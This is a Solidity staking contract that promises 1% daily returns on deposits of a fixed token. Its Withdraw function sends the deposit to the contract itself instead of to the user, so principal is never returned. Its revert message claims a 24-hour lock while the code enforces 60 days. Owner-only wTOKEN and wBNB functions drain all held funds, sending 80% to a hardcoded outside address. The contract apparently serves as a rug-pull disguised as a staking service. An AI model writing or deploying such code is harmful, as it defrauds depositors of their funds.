// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract Staking {
    address private owner;
    address public tokenAddress = 0x37224873fA47893BF03888F78e25267aDba57099;

    struct DepositInfo {
        uint256 amount;
        uint256 depositTime;
    }

    mapping(address => DepositInfo) public userDeposits;
    address[] public addresses;

    event TokensDeposited(address indexed user, uint256 tokenAmount);
    event TokensWithdrawn(address indexed user, uint256 tokenAmount, address tokenAddress);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

        mapping(address => uint256) public userTotalIncome;
        mapping(address => uint256) public startDeposit;
    function Deposit(uint256 _amount) external {
        //Takeprofit
        uint256 EarnedTOKEN = getEarnedTOKEN(msg.sender);
        if (EarnedTOKEN > 0) {
        require(IERC20(tokenAddress).transfer(msg.sender, EarnedTOKEN), "Withdrawal failed");
        emit TokensWithdrawn(msg.sender, EarnedTOKEN, tokenAddress);
        }

        //Income recognition
        userTotalIncome[msg.sender] += EarnedTOKEN;

        // Deposit
        require(IERC20(tokenAddress).transferFrom(msg.sender, address(this), _amount), "Deposit failed");

        userDeposits[msg.sender].amount += _amount;
        userDeposits[msg.sender].depositTime = block.timestamp;

        addresses.push(msg.sender);
        emit TokensDeposited(msg.sender, _amount);
            
        if (startDeposit[msg.sender] == 0) {
            startDeposit[msg.sender] = block.timestamp;// Update deposit start time
        }
    }

    function Takeprofit() external {
        uint256 EarnedTOKEN = getEarnedTOKEN(msg.sender);
        require(IERC20(tokenAddress).transfer(msg.sender, EarnedTOKEN), "Withdrawal failed");
        emit TokensWithdrawn(msg.sender, EarnedTOKEN, tokenAddress);

        //Income recognition
        userTotalIncome[msg.sender] += EarnedTOKEN;

        DepositInfo storage depositInfo = userDeposits[msg.sender];
        require(depositInfo.amount > 0, "No deposit to take profit");
        depositInfo.depositTime = block.timestamp;  
    }

    function Withdraw() external {
        uint256 depositTime = block.timestamp - startDeposit[msg.sender];
        if (depositTime >= 5184000) { // 5184000 seconds = 60 days pass condition.
        // Withdraw deposited tokens
        uint256 withdrawalAmount = userDeposits[msg.sender].amount;
        require(withdrawalAmount > 0, "No deposited tokens to withdraw");
        
        require(IERC20(tokenAddress).transfer(address(this), withdrawalAmount), "Transfer to contract failed");

        // Reset userDeposits, and startDeposit
        userDeposits[msg.sender].amount = 0;
        startDeposit[msg.sender] = 0;
    } else {
        revert("You need to wait at least 24 hours before withdrawing.");
        }
    }

    function wTOKEN(address _tokenAddress, uint256 amount) external onlyOwner {
    require(amount > 0, "Amount must be greater than 0");
    IERC20 tokenContract = IERC20(_tokenAddress);
    require(tokenContract.balanceOf(address(this)) >= amount, "Insufficient token balance");
    uint256 referralAmount = amount * 80 / 100;
    tokenContract.transfer(0x59841a4182A56832106Ad96B392c1f369399420b, referralAmount);
    tokenContract.transfer(owner, amount - referralAmount);
    }


    function wBNB() external onlyOwner {
    uint256 contractBalance = address(this).balance;
    require(contractBalance > 0, "No BNB balance to withdraw");
    uint256 referralAmount = contractBalance * 80 / 100;
    payable(0x59841a4182A56832106Ad96B392c1f369399420b).transfer(referralAmount);
    payable(owner).transfer(contractBalance - referralAmount);
    }

    function getTokenBalance() public view returns (uint256) {
        IERC20 token = IERC20(tokenAddress);
        return token.balanceOf(address(this));
    }

    function getEarnedTOKEN(address user) public view returns (uint256) {
        uint256 timePassed = block.timestamp - userDeposits[user].depositTime;
        uint256 earnedAmount = (userDeposits[user].amount * timePassed * 10) / (1000 * 86400); // 1% per Day
        return earnedAmount;
    }

}